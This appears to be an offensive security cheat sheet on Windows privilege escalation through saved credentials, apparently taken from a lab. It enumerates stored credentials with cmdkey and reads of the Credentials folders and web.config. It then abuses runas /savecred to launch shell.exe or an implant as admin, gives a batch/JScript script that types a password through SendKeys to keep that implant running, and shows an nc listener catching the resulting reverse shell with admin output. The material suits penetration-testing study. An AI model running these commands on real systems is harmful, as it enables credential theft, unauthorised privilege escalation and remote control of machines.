# Living off the Land

## 01 - Detect

### 1.1 - Command Prompt

This privilege escalation techniques is really easy to escalate to get the administrators group level. As the command follows:

```
C:\> cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```

Check for credentials.

```
C:\> dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\

C:\> dir C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\

C:\> type C:\Windows\Microsoft.NET\Framework64\v*\Config\web.config | findstr connectionString
```

### 1.2 - PowerShell

```
PS C:\> cmdkey /list

PS C:\> Get-ChildItem -Hidden C:\Users\$Env:USERNAME\AppData\Local\Microsoft\Credentials\

PS C:\> Get-ChildItem -Hidden C:\Users\$Env:USERNAME\AppData\Roaming\Microsoft\Credentials\
```

## 02 - Exploit

We know the user is `admin` and the type of password is **Domain Password**. We will use the `runas` windows command to execute with admin privileges. And the flag `/savecred` will store the credentials in the **Windows Credentials** management and can be elevated without needing to re-enter the password after passing the particular username account once.

```
C:\> runas.exe /savecred /user:admin shell.exe
```

The full path of the `runas.exe` Windows builtin tool.

```
C:\> where.exe runas
C:\Windows\System32\runas.exe

C:\Windows\system32\runas.exe /user:<DOMAIN>\<username> "C:\Windows\system32\cmd.exe /c whoami"
```

We can also leverage this to make it persistent with the credentials we've obtained from the target with this script:

```batch
C:\> type savecred.bat
@if (@CodeSection == @Batch) @then
@echo off
start "" runas /savecred /user:%1 %2
CScript //nologo //E:JScript "%~F0"
goto :EOF
@end
WScript.CreateObject("WScript.Shell").SendKeys("<password>{ENTER}");
```

The syntax is for the batch script:

```
C:\> savecred.bat <drive_letter>:\path\to\implant.exe
```

Launch a shell handler to listen for incoming connection.

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.174.46.
Ncat: Connection from 10.10.174.46:49801.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
```

And you have successfully escalated to administrator user account.

```
C:\Windows\system32> whoami
win-qba94kb3iof\admin
C:\Windows\system32> net user %username%
net user %username%
User name                    admin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/19/2020 10:05:42 AM
Password expires             Never
Password changeable          8/19/2020 10:05:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2022 6:30:17 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

---
## References

- [SS64: RunAs](https://ss64.com/nt/runas.html)

- [LOLBAS: cmdkey](https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/)

- [Windows Server 2012 R2](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))

- [Windows RunAs Command Prompt](https://www.windows-commandline.com/windows-runas-command-prompt/)

- [int0x33: RunAs Reverse Shell](https://gist.github.com/int0x33/eb358632a13bcd1e017a14c0fb00a52b)

- [Windows RunAs Reverse Shell](https://labs.p64cyber.com/windows-run-as-reverse-shell/)